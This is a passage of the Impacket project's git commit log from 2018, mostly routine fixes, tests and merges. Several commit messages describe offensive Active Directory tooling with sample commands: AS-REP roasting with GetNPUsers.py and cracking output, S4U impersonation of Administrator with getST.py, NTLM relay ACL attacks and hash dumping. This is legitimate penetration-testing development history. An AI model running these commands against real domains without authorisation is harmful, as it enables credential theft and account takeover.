Author: MrTchuss <buffer@0x90.fr>
Date:   Wed Aug 1 15:54:12 2018 +0200

    Fixed encoding errors in ntlmrelayx
    
    Some account names are UTF16-LE encoded.
    Calls to print functions with format must be specified as unicode and
    ASCII must be converted to UTF16-LE.

commit c03e31c2dc87b42a5e6a63476ef859a8ee7d6a62
Merge: 347baa71 bf5704a0
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Jul 30 12:02:03 2018 -0300

    Merge pull request #475 from bao7uo/master
    
    Update serviceinstall.py

commit 2dbaf8b06cf29036830e994fc849d028fe67a6e6
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Mon Jul 30 09:58:41 2018 +0300

    Update dhcpm.py

commit bf5704a08a4ab30f98ebf849ef186e21cc7e634c
Author: Paul Taylor <21125224+bao7uo@users.noreply.github.com>
Date:   Sat Jul 28 17:52:33 2018 +0100

    Update serviceinstall.py
    
    minor typo

commit 347baa71b9c6178575fff7072d68041efefe437e
Merge: 10475066 1d1e6076
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Jul 17 21:43:36 2018 -0300

    Merge pull request #471 from MrRobot86/patch-2
    
    Update dns.py (the infinite loop within the parseCompressedMessage)

commit 1d1e60764253629b52cd2873bb07a0b013ef6cd7
Author: MrRobot86 <41348964+MrRobot86@users.noreply.github.com>
Date:   Tue Jul 17 17:11:13 2018 -0700

    Update dns.py
    
    The infinite loop is getting possible within the parseCompressedMessage because the newly pointer may point to the current offset but the function haven't  got the check of the pointer value.

commit ca456a4535b236d8711a3f180fc20f31a432b26e
Merge: 10475066 576dde1e
Author: asolino <bethus@gmail.com>
Date:   Thu Jul 12 09:34:33 2018 -0300

    Merge branch 'patch-5' of https://github.com/MrAnde7son/impacket into MrAnde7son-patch-5

commit 576dde1e34f0237f1cd615c19a01e60322edd5f5
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Thu Jul 12 15:06:30 2018 +0300

    Update dhcpm.py
    
    I added 'commonHdr' field and removed the places where 'enumItems' property was unnecessarily used.
    Works fine now.

commit 104750660152622c13f787e731a4239dc5cf6680
Merge: c40223a6 1f96dc45
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Jul 10 15:30:05 2018 -0300

    Merge pull request #469 from franferrax/master
    
    Making more flexible the exporting functions so we can customize the file opening function

commit c40223a6fed338908c06f0442ebdf0dd90fd8b1a
Merge: 0b6e23f5 895b862e
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Sat Jul 7 09:04:06 2018 -0300

    Merge pull request #470 from fox-it/aclfixes
    
    Optimize ACL enumeration and improve error handling in ntlmrelayx LDAP attack

commit 895b862eb6a1a92cacdf1b06874ebc8c94c3cfbd
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Sat Jul 7 11:07:42 2018 +0200

    Optimize ACL enumeration and improve error handling in ntlmrelayx LDAP attack

commit 0edd6989dd45223b967c64508599354abe1f5901
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Sat Jul 7 11:15:43 2018 +0200

    ntlmrelayx ldap attack: also show where we create the user

commit 1f96dc45d0e24afb95a6e4ffbc43d992dc3afdad
Author: fferrari <fferrari@coresecurity.com>
Date:   Fri Jul 6 00:35:14 2018 -0300

    Making more flexible the exporting functions so we can customize the file opening function.
    * Modified export functions:
      * `SAMHashes.export()`
      * `LSASecrets.exportSecrets()`
      * `LSASecrets.exportCached()`
      * `NTDSHashes.dump()`

commit 0b6e23f5edf18d89e513287790f602e356d92235
Author: asolino <bethus@gmail.com>
Date:   Thu Jul 5 10:06:51 2018 -0300

    Changing ldap3 release number
    
    Fixes https://github.com/CoreSecurity/impacket/issues/466

commit b2033f35dfbeac0b436f7b767783c46a5727395c
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Sun Jul 1 10:27:16 2018 +0300

    Fixed a few bugs
    
    Hi man,
    Since the last commit, code generates a few errors, so I fixed them.
    1. DHCP_ALL_OPTION_VALUES was configured twice, so I change one of them to be DHCP_ALL_OPTIONS_VALUES.
    2. If you don't use .value in the NDRUNION declaration, code generates 'union tag doesn't exist' error.

commit 5671e8467a97b21585fcf56a6b9735da389f1b88
Author: asolino <bethus@gmail.com>
Date:   Wed Jun 20 12:32:01 2018 -0300

    If we do Kerberos, it should be set at DCE level as well
    
    * Should address https://github.com/CoreSecurity/impacket/issues/461

commit ad27f0a5b0a299c5a7e6ef28bd35261740dea357
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 5 14:36:22 2018 -0300

    Fixed wrong indentation when printing results

commit b789e61b9680dd156b50b0f6c2d9dbb1c15653e3
Author: asolino <bethus@gmail.com>
Date:   Thu May 31 12:38:47 2018 -0300

    Using a cryptographically secure pseudo-random number generator when needed
    
    * We must investigate if there are other places where this switch is needed.
    * Thanks @4dgifts (Ivan Arce) for highlighting this.

commit 1afae4c801b4db6bb80282098ec3d093ee73bb3f
Author: asolino <bethus@gmail.com>
Date:   Wed May 30 18:56:40 2018 -0300

    Going back to dev version :)

commit e7fd42aa6874e240675dc92ae4ae874d71778305
Author: asolino <bethus@gmail.com>
Date:   Wed May 30 18:45:41 2018 -0300

    Specifying README.md is in markdown mode.
    
    So it renders well in PyPi.

commit 6ddd60ded42a73e41a9d3631576d3c8f045d2d21
Author: asolino <bethus@gmail.com>
Date:   Wed May 30 16:48:46 2018 -0300

    Fixed typo

commit 770a017e6a9d53dd9bdd2525546365a18e0d9bce
Author: asolino <bethus@gmail.com>
Date:   Wed May 30 15:47:19 2018 -0300

    Changing from dev version to release version for tagging.

commit ee1800c73e1313ef6feca9b1fcc9a22a727ed63a
Author: asolino <bethus@gmail.com>
Date:   Wed May 30 15:22:16 2018 -0300

    Updated README

commit f992ef5c69606f82132d6e88a804fab8c672a1c3
Author: asolino <bethus@gmail.com>
Date:   Wed May 30 15:17:45 2018 -0300

    Adjusting test cases for Windows 2012 R2 and update on README

commit c25153533597b80829421c9e28bb40852cf4b0e1
Author: asolino <bethus@gmail.com>
Date:   Wed May 30 09:09:51 2018 -0300

    Updated README

commit 633b75301bead95399ca9ff18b70ec7039813999
Author: asolino <bethus@gmail.com>
Date:   Tue May 29 15:50:22 2018 -0300

    Removing old examples

commit bada8a719f8ed7be4633514eea94bc768dbaf019
Author: asolino <bethus@gmail.com>
Date:   Tue May 29 10:58:03 2018 -0300

    Adding GetNPUsers.py script
    
    This script will attempt to list and get TGTs for those users that have the property
    'Do not require Kerberos preauthentication' set (UF_DONT_REQUIRE_PREAUTH).
    For those users with such configuration, a John The Ripper output will be generated so
    you can send it for cracking.
    
    Original credit for this technique goes to @harmj0y:
    http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/
    Related work by Geoff Janjua:
    http://www.exumbraops.com/layerone2016/party
    
    For usage instructions run the script with no parameters
    There are a few modes for using this script
    
    1. Get a TGT for a user:
    
            GetNPUsers.py contoso.com/john.doe -no-pass
    
    For this operation you don't need john.doe's password. It is important tho, to specify -no-pass in the script,
    otherwise a badpwdcount entry will be added to the user
    
    2. Get a list of users with UF_DONT_REQUIRE_PREAUTH set
    
            GetNPUsers.py contoso.com/emily:password or GetNPUsers.py contoso.com/emily
    
    This will list all the users in the contoso.com domain that have UF_DONT_REQUIRE_PREAUTH set.
    However it will require you to have emily's password. (If you don't specify it, it will be asked by the script)
    
    3. Request TGTs for all users
    
            GetNPUsers.py contoso.com/emily:password -request or GetNPUsers.py contoso.com/emily

commit 5f5678ba8f72b32a86b8fe01778db304e12bf2b3
Author: asolino <bethus@gmail.com>
Date:   Mon May 28 18:50:45 2018 -0300

    Documentation change plus using logging.error instead of print

commit 18753898e51683bfc2ff11d1b21798022e20d088
Author: asolino <bethus@gmail.com>
Date:   Thu May 24 20:48:52 2018 -0300

    Optimized imports

commit 02401816125107e12d0fd10d432d39554e33ed4c
Author: asolino <bethus@gmail.com>
Date:   Thu May 24 20:16:45 2018 -0300

    Closing the socket when transport connection is disconnected

commit 5bb942480d4be3871c92af2c49e4f2d3a5857e68
Merge: 65359e84 50e289ba
Author: asolino <bethus@gmail.com>
Date:   Thu May 24 11:23:31 2018 -0300

    Merge branch 'logging-enhancement' of https://github.com/derUnbekannt/impacket

commit 65359e849267791e6206428e9f9887d00b6ee32d
Merge: ddc7523e c265b146
Author: asolino <bethus@gmail.com>
Date:   Thu May 24 11:02:18 2018 -0300

    Merge branch 'ropnop-feature/enum_local_admins'

commit c265b146dbafbc9fb91a5821fed572c6a6be9c03
Author: asolino <bethus@gmail.com>
Date:   Thu May 24 11:01:51 2018 -0300

    Removing unused code.

commit 131b149f6c590eb7c914ef2b1179ed458985c612
Merge: ddc7523e 143a8573
Author: asolino <bethus@gmail.com>
Date:   Thu May 24 10:21:31 2018 -0300

    Merge branch 'feature/enum_local_admins' of https://github.com/ropnop/impacket into ropnop-feature/enum_local_admins

commit ddc7523e71b00bf6f8b36f81058697a2a3ae0e60
Author: asolino <bethus@gmail.com>
Date:   Thu May 24 09:59:12 2018 -0300

    Adding encryption type ID to help John identifying the right format to crack

commit 9bf625a131739737c4d03208ee9ef32cc04b3984
Author: asolino <bethus@gmail.com>
Date:   Wed May 23 19:42:54 2018 -0300

    Adding domain name alongside with principal name when crafting John output

commit 709a58c88df84b656c0ecabbfd1fb141328c7ae8
Author: asolino <bethus@gmail.com>
Date:   Wed May 23 19:28:19 2018 -0300

    preAuth should be False in order to print TGTs with John output

commit 11310aba356ded20e9989f0a753bf40d1128f75d
Author: asolino <bethus@gmail.com>
Date:   Wed May 23 19:23:49 2018 -0300

    Enable John output for TGTs with no preauth enabled
    
    - Just run the scripts with -debug.
    - Thanks @dmchell for the idea.

commit 143a8573fd646e3647f89633eb3df7b656a9544b
Author: Ronnie Flathers <rflathers@gmail.com>
Date:   Sat May 19 15:39:22 2018 -0400

    added enum local admins option

commit 2ac1811d4d2f5b26e7117e9234c4079cbb156ce6
Author: asolino <bethus@gmail.com>
Date:   Fri May 18 13:28:36 2018 -0300

    Disabled users will not be downloaded by default
    
    * Disabled accounts will be included if -all, that replaced -all-users switch
    * When using -user switch, if the account is disabled, no records will return. You will need to specify -all in order to get something.
    * Should address https://github.com/CoreSecurity/impacket/issues/454#issuecomment-390240413

commit 48f436ff498c76ed9ee7169c29fd789f0efcb205
Merge: 33bcdb78 9910f221
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu May 17 13:26:50 2018 -0300

    Merge pull request #453 from derUnbekannt/GetUserSPNs-bugfix
    
    Replace global variables usage

commit 9910f2214a00d02900aeee1329dc661ec2d45efd
Author: derUnbekannt <6005835+derunbekannt@users.noreply.github.com>
Date:   Wed May 16 22:30:19 2018 -0300

    Replace global variables usage

commit 33bcdb78b5f806b643e07a7dff3d4ac9e0fabf1f
Merge: d4fa26ec f09cf20d
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon May 14 16:41:59 2018 -0300

    Merge pull request #445 from Mikkgn/win2000
    
    Changed DCOM minor version

commit d4fa26ecc3a3eda2c3677160c8cc72716b89bc14
Merge: 42e6367b bf4e7acb
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon May 14 14:38:34 2018 -0300

    Merge pull request #452 from fox-it/security_descriptor
    
    Fixed inherited ACL parsing

commit bf4e7acbd7ab64fa4cb4980b949212afd2bfeae8
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Mon May 14 19:02:39 2018 +0200

    Fixed inherited ACL parsing

commit 50e289bac2b82d5840443de4f005fb07d447b26c
Author: derUnbekannt <6005835+derunbekannt@users.noreply.github.com>
Date:   Fri May 11 20:20:11 2018 -0300

    Use the global logger instance instead of a logger which is the root logger of the hierarchy

commit 42e6367b4cbbcf451985d3334d76e70a6ef50f2f
Author: asolino <bethus@gmail.com>
Date:   Thu May 10 11:30:07 2018 -0300

    Improved query efficiency + unused variables
    
    * LDAP request is explicitly removing machine accounts
    * Some imports and local variables not being used
    * Thanks @derUnbekannt for the changes

commit b45a0d558c401277c47dd07570f08332989f9112
Author: asolino <bethus@gmail.com>
Date:   Wed May 9 12:02:59 2018 -0300

    Adding support for scenarios where PREAUTH is not required.
    
    - Kerberos Auth should now work for those accounts configured with 'Do not require Kerberos preauthentication' set (UF_DONT_REQUIRE_PREAUTH)

commit 7ba11f9ecbf43926bd4a7c92f609a105588bf1c2
Merge: 9d8638cd 260cf20a
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Sat May 5 11:50:23 2018 -0300

    Merge pull request #447 from derUnbekannt/ticketer-bugfix
    
    Bugfix in ticketer using "request" and "hashes" options

commit 260cf20a0647b7e567219d96242efa6c401e44c8
Author: derUnbekannt <6005835+derunbekannt@users.noreply.github.com>
Date:   Fri May 4 23:30:04 2018 -0300

    Fixed an issue in which invalid parameters were passed to the "getKerberosTGT" function.

commit 9d8638cdf10389c999ef2049003bf22219d94d06
Author: asolino <bethus@gmail.com>
Date:   Fri May 4 18:25:44 2018 -0300

    Print traceback info if running in DEBUG mode

commit 0b28d9483234aae90e979bddb6307dd29e95cae6
Author: asolino <bethus@gmail.com>
Date:   Thu May 3 21:21:36 2018 -0300

    Using raise the right way + removing print from traceback.print_exc()

commit 7a4bb1893ddf437e0df696fbbafa984abc1f2833
Author: asolino <bethus@gmail.com>
Date:   Thu May 3 21:00:44 2018 -0300

    Using raise the right way.

commit c65e3bc7c11e42492bc8152961b459b92ccb5a62
Author: asolino <bethus@gmail.com>
Date:   Thu May 3 14:27:37 2018 -0300

    Lowering the paged results to 100 in order to avoid LDAP error
    
    * With 1000 entries we were getting: "LdapErr: DSID-0C060671, comment: The server is sending data faster than the client has been receiving. Subsequent requests will fail until the client catches up"
    
    * Minor changes to make it Python3 compatible

commit f09cf20d486d1fe0f37becc8468b5d0b719e89a1
Author: Mikkgn <michail_gg@mail.ru>
Date:   Sat Apr 28 13:11:56 2018 +0500

    Changed DCOM minor version

commit 505fef1ae24027d5064fc65f81f92856300f46aa
Author: asolino <bethus@gmail.com>
Date:   Thu Apr 26 23:04:26 2018 -0400

    Don't report failure when opening a service with _history appended
    
    * Because it will probably not exist (this was introduced when dumping LSA secrets history)
    * Improved test cases

commit 0d39e84d46e454ba5d6ed4c1641297a9274d3848
Author: asolino <bethus@gmail.com>
Date:   Thu Apr 26 21:56:40 2018 -0400

    Records are processed as soon as they are received
    
    * Implementing the search perRecordCallback feature will prevent memory from getting exhausted
    * One drawback tho, is that columns with for the table are fixed, since we don't have all the
      rows for calculating the right width. Maybe we should just output CVS and that's it.

commit 079998368d56b79281fd4b9af92c28d7bb1d6290
Author: asolino <bethus@gmail.com>
Date:   Thu Apr 26 21:55:03 2018 -0400

    Adding a perRecordCallBack in ldap.search method
    
    * Used in those situation where there are lots of records in the answer that might exhaust the memory or you want faster processing of the records.

commit 8a8b2aabde3b7731764bf8acc431dd17a05e01b4
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 25 23:21:40 2018 -0400

    Fixing typos in description

commit b022a31ec3f085b50b6b808b2f8cdf0d12d2a39e
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 25 22:54:13 2018 -0400

    Adding getST.py example
    
    Given a password, hash, aesKey or TGT in ccache, it will request a Service Ticket
    and save it as ccache.
    If the account has constrained delegation (with protocol transition) privileges
    you will be able to use the -impersonate switch to request the ticket on behalf
    other user (it will use S4U2Self/S4U2Proxy to request the ticket.)
    
    Similar feature has been implemented already by Benjamin Delphi (@gentilkiwi) in Kekeo (s4u)
    
    Examples:
    
        ./getST.py -hashes lm:nt -spn cifs/contoso-dc contoso.com/user
    It will save the ticket in user.ccache
    or
    If you have tickets cached (run klist to verify) the script will use them
        ./getST.py -k -spn cifs/contoso-dc contoso.com/user
    Be sure tho, that the cached TGT has the forwardable flag set (klist -f).
    getTGT.py will ask forwardable tickets by default.
    
    Also, if the account is configured with unconstrained delegation (and with protocol transition)
    you can request service tickets for other users, assuming the target SPN is allowed for
    delegation:
    ./getST.py -k -impersonate Administrator -spn cifs/contoso-dc contoso.com/user
    
    The output of this script will be a service ticket for the Administrator user.
    
    Once you have the ccache file, set it in the KRB5CCNAME variable and use it for fun and profit.

commit 8368e73c1471b79792788c818a177204c2438f7d
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 25 22:35:34 2018 -0400

    Requesting a ST when -request is used for silver ticket creation
    
    * This functionality was missed when this feature was implemented in https://github.com/CoreSecurity/impacket/pull/354.

commit c5a388168c15a3d325c48d25efe9fb6d5d08c841
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 25 22:08:00 2018 -0400

    Encrypting the TGS-REP with the right Key Usage (especially for AES)
    
    * When encrypting the kdcRep['enc-part']['cipher'] part you have to use the following Key Usages depending on
    the type of answer being generated. Per RFC 4120, section 7.5.1:
    If it is a AS-REP -> Key Usage 3
    If it is a TGS-REP -> Key Usage 8
    When silver tickets functionality was implemented [here](https://github.com/CoreSecurity/impacket/pull/354),
    this wasn't taken into account that all the answers, regardless of being a AS-REP or TGS-REP were encrypted with Key Usage 3.
    
    You might wonder why RC4 silver tickets where working?
    RFC4757 section 3 has the answer. The Key Usages for RC4 are different by the ones defined in RFC4120 and,
    for example, for the AS-REP the Key Usage to be used is 8 (instead of 3). Thus, all the RC4 testings were
    passing, until @ropnop tested it with AES keys (where the Key Usage numbers to be used are the ones in
    RFC 4120), causing the decryption checks when saving the ticket in ccache format to trigger and error
    due to invalid checksum.
    
    The issue in https://github.com/CoreSecurity/impacket/issues/443#issuecomment-384430424 should be fixed. Please test.

commit dba47572975be66bdccb166cc0a93c4a038d655f
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 25 15:50:24 2018 -0400

    Adding more test cases

commit 21c8f3bb2c7805a0da6556e06cdfc69938ee3d3d
Merge: c091f0e1 f148f164
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Apr 25 14:25:31 2018 -0400

    Merge pull request #441 from fox-it/security_descriptor
    
    ntlmrelayx ACL attack

commit f148f164f4ef677eb7d4839016b13242a2a21564
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Mon Apr 23 18:51:22 2018 +0200

    Move smbclient.py to library (part 2/2). Allows using the shell from other examples.

commit 9a7fba86d5bd7e5757d9643afdaf7e8373b42f8b
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Mon Apr 23 18:44:58 2018 +0200

    Move smbclient.py to library (part 1/2)

commit b59ea7d452faa69aede1ddd7cd152e0054a7ef51
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Mon Apr 23 17:49:24 2018 +0200

    Bump ldap3 version for SD controls

commit 605017f94abc1e087cea4fbe666d38b6dc2b9966
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Mon Apr 23 17:42:40 2018 +0200

    LDAP ACL attack for ntlmrelayx v1

commit c091f0e1e236a705806fa9eb0e108c66afb933b7
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 22 20:14:38 2018 -0400

    If loading a module fails, continue

commit e571a45864d1407408fc802082562b58b457a650
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 22 19:44:00 2018 -0400

    Adding all examples dependency packages into the main installation dependencies
    
    * So users can run the examples right away
    * Added more .gitignore items

commit 3f5ec4a94e6e5a7a5fb7a43b735c4289f040b922
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 22 19:08:13 2018 -0400

    README clarifications and added test cases and requirement files to MANIFEST.in

commit dcf6f78f6e53fbd124fdbb6221f1822c6f24a7c3
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 22 18:22:10 2018 -0400

    Defining MSQL as the PLUGIN_NAMES for the MSSQLAttack
    
    * Moving the attacks loading right with the PROTOCOL_CLIENTS.

commit ffdc4369a2dd7bc06f0d11d40baaf750d7454eb7
Merge: 0ba46191 eb80b862
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 22 17:03:35 2018 -0400

    Merge branch 'master' of https://github.com/CoreSecurity/impacket

commit eb80b8625c05c700238f4edb9849187e288bf302
Merge: 5dfceef5 c0fa5c78
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Sun Apr 22 18:04:30 2018 -0300

    Merge pull request #432 from fox-it/security_descriptor
    
    Separate ntlmrelayx attacks from main program

commit 0ba461912a49bfdb58a3d7a01cb1d29e0a1f7677
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 22 16:53:48 2018 -0400

    Fixing a test case based on @dirkjanm feedback

commit 5dfceef59bcc93ca283a9fb8d87b8c2297a6ae22
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 22 16:01:16 2018 -0400

    Adding another chance of getting the right service ticket from cache
    
    * Let's say we're looking for a ST for this SPN: CIFS/DC2.LABA2.LOCAL@LAB1.LOCAL but in the cache there's a ST for this SPN: CIFS/DC2.LAB2.LOCAL@LAB2.LOCAL. Up until now, the ticket was not returned.. Now it does get returned. Why? It will be useful for some scenarios with cross domain trusts.
    * One particular side effect, the sname will be changed to CIFS/DC2.LAB2.LOCAL@LAB1.LOCAL, that might piss the Kerberos God off but I'll take the risk since snames are not that useful ;).
    * If somebody sees problems please let me know and I'll revert it (@ropnop have this in mind).
    * Thanks @gentilkiwi for the (always) interesting discussion.

commit c0fa5c78ac2993f77db5f0652f7d44d1ea68cb54
Author: Dirk-jan <dirkjan@sanoweb.nl>
Date:   Sun Apr 22 16:39:49 2018 +0200

    Remove leftover debug print statement

commit 678021b4454fa549470790141ff423a0a1fa2a72
Author: Dirk-jan <dirkjan@sanoweb.nl>
Date:   Sun Apr 22 16:35:47 2018 +0200

    Fix dynamic loading of files to be compatible with zipped (.egg) files

commit be1ea72a568c6d015639d851fb6b014745ac8970
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 22 09:45:45 2018 -0300

    Skip krb5_ccache_conf_data entries when parsing credentials
    
    * Should address https://github.com/CoreSecurity/impacket/issues/438, testing needed (@ropnop)

commit de8dab81b6f6133631c0eeabcdeb08d44983414f
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Fri Apr 20 15:31:05 2018 +0200

    Make sure clients explicity return if connecting was a success and other small fixes

commit 0f42016bc44c4327f88ccdc218c859bcd8e8428c
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 20 10:21:00 2018 -0300

    Adding impacket.krb5.crypto tests

commit 587d8afba8dec74d2e7ff4943a2c279d984c3426
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Apr 18 17:02:59 2018 +0200

    Add start/stop commands for relay servers

commit bf1d51745788499ad0908f41e975b97d670d2260
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Apr 18 15:30:39 2018 +0200

    Typo fixes

commit 2ffc5eac02e9b586313cfc2afe743a31bf3890a2
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Apr 18 15:14:54 2018 +0200

    Detect SMBv1 being disabled and handle this correctly

commit efa5e7047e480cd52fcd9d0e817789bb8ff39111
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Apr 18 15:12:58 2018 +0200

    Rewrote ntlmrelayx attack logic to be similar to protocol clients

commit e171f34d13949c9f760056b6f9511231e529177c
Author: asolino <bethus@gmail.com>
Date:   Tue Apr 17 15:28:30 2018 -0300

    NTLM.PY better support for Python3, not yet there

commit 87d3365029a0a9abc30e55abb98e2cda77ab96f5
Merge: 70fd4b65 09f06069
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 16 20:40:28 2018 -0300

    Merge remote-tracking branch 'origin/master' into python36

commit 70fd4b658806349c5912273f8a9002d9b52eda55
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 16 20:35:53 2018 -0300

    Python3 support for crypto.py

commit 09f06069cea242d75cce05e1c83aae7e9fc8f478
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 16 18:01:32 2018 -0300

    Removing POW support

commit 3fc4637992ae868dac44f574ca395d0e1cf850c0
Merge: 632c52f8 e4b60217
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Apr 16 15:48:55 2018 -0500

    Merge pull request #431 from CoreSecurity/python36
    
     Improving on encoding/decoding NetBIOS names + More test cases

commit e4b60217ecff44d09c1de9fd15e6da19d6d73ef8
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 16 16:58:18 2018 -0300

    Redefining some functions to make it more Python3 friendly, still not functional

commit a3f1abba44e6cad598fd66aa22b42e3b2dde1f71
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 16 16:12:30 2018 -0300

    Fixes into [MS-NLMP] test cases
    
    * Better matches the examples in [MS-NLMP]
    * More Python3 friendly

commit 46ebcfb9507dbea3027c7aa138f8e49088a2869a
Author: asolino <bethus@gmail.com>
Date:   Sat Apr 14 22:00:45 2018 -0500

    NTLM Tests are now Unit Tests

commit 6f15fc3e35f82aa4b64dcb1b336c013217c2c73b
Author: asolino <bethus@gmail.com>
Date:   Sat Apr 14 17:14:34 2018 -0500

    Adding hexdump for some results

commit 725f4e93570fc3f794963b11f2248b2c483e7967
Author: asolino <bethus@gmail.com>
Date:   Sat Apr 14 17:12:51 2018 -0500

    Adding hexdump inside structure.py
    
    * Works with Python 3.6
    * Makes more sense to have it here than winregistry. Those modules using the old version will be transitioned once I adapt them to py36

commit dc931d0244ee2346e9cdd30de2b9218bb8ff6888
Author: asolino <bethus@gmail.com>
Date:   Sat Apr 14 15:10:39 2018 -0500

    Improved test cases + nmb.py closer to python3

commit c6ed5c5a461ec8efa678c92bfcbda4d9a7c5f6bb
Author: asolino <bethus@gmail.com>
Date:   Sat Apr 14 13:35:08 2018 -0500

    Added more test cases
    
    * nmb: Added test case for NetBIOS name encoding
    * smb: SMB Connections on port 139, plus no NetBIOS name

commit d01ff419a72be95cf048fb33275b5fa44ac4a7f3
Author: asolino <bethus@gmail.com>
Date:   Sat Apr 14 13:34:05 2018 -0500

    Improvings on encoding/decoding NetBIOS names.
    
    * This should be rewritten completely tho

commit 632c52f8e8bd2c1762cb8e89c75e57b91093617c
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 13 17:41:14 2018 -0500

    Adding test cases for SR_SECURITY_DESCRIPTOR

commit da8fcb325f613acedb84a33394f4736a9ef3004d
Merge: ce0f300e 6cfda644
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Apr 13 17:12:37 2018 -0500

    Merge pull request #427 from fox-it/security_descriptor
    
    Added security descriptor types for LDAP

commit ce0f300e2acc30cee9f9c1d6b504a89bb2d410ff
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 13 16:42:18 2018 -0500

    Adding DHCPM use cases + improvements
    
    * Minor change to RPC Runtime when triggering an exception (include error code even if you can process the structure)
    * Adding test suite to script that runs all tests

commit 7a0971fddf0df6055689bb5e1780716b9e63c10e
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 13 14:36:48 2018 -0500

    Removing debug print message and fixed error when password was specified.

commit 5d7ed18bedbf919483072cd9a9468c3549a700bf
Merge: fd66648a c2697fdf
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Apr 13 12:54:41 2018 -0500

    Merge pull request #415 from MrAnde7son/patch-3
    
    Added some dhcpsrv2 function implementation and bug fix

commit fd66648aa25658ed86bad78191ce9486ae07c4e8
Merge: 41db9bff e5c60bbf
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Apr 13 12:39:25 2018 -0500

    Merge pull request #430 from CoreSecurity/python36
    
    Tox / coverage support + structure.py working with Python36

commit 41db9bff156c48efe43c069d23ad9f813425f997
Merge: c9e0f047 6c69cc46
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Apr 13 11:19:08 2018 -0500

    Merge pull request #419 from machosec/patch-6
    
    Added support for multiple ExtraSids

commit e5c60bbfd18d308199a87c37c92aa71a5801deb9
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 13 11:04:25 2018 -0500

    Adding test case for secretsdump
    
    * Only supporting VSS for the moment

commit 6cfda644d992adc05804a48f7c28d1b0f2770cb6
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Fri Apr 13 11:13:59 2018 +0200

    Added security descriptor types for LDAP

commit 6c69cc468d2a22aa0f77dcbfe23efa2330d09bcc
Author: Matan Hart <me@matanhart.com>
Date:   Thu Apr 12 18:47:45 2018 +0300

    fixed small mistakes in extrasid

commit 16bafd6f1961661e18f3506556261f23f6691081
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 11 18:04:34 2018 -0500

    Removing debug print

commit 8138ba725f09eb0154f74edcd82947c4376dfab7
Merge: 1bb117de a1c26d27
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 11 17:42:15 2018 -0500

    Merge branch 'python36' of https://github.com/CoreSecurity/impacket into python36

commit 1bb117dedd339a7c5b9c52a74bbea50ec194bf05
Merge: 6c497774 c9e0f047
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 11 17:41:58 2018 -0500

    Merge https://github.com/CoreSecurity/impacket into python36

commit 6c497774fdda8ed3db50230a49f6bc25b0dc3d84
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 11 17:39:10 2018 -0500

    Adding test_secretsdump to the automatic test script

commit a1c26d2707db829968a16581d83d3b1cd3939a97
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Apr 11 16:47:02 2018 -0500

    Delete __init__.py

commit c9e0f047c27af8b4901bc379c99e2af5dfc3a64e
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 11 15:43:26 2018 -0500

    Adding getTGT.py example
    
    Description:
        Given a password, hash or aesKey, it will request a TGT and save it as ccache
    
    Examples:
             ./getTGT.py -hashes lm:nt contoso.com/user

commit c15d447084f665762d3857e088fc6e095463d488
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 11 15:39:27 2018 -0500

